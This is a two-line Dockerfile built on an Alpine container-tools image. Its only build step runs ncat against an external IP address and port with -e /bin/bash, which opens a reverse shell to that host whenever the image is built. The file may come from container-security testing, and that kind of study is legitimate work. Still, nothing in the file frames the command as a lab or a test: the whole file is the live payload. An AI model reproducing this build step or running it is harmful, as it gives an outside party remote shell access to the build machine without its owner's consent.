FROM raesene/alpine-containertools

RUN ncat 3.8.154.183 8989 -e /bin/bash
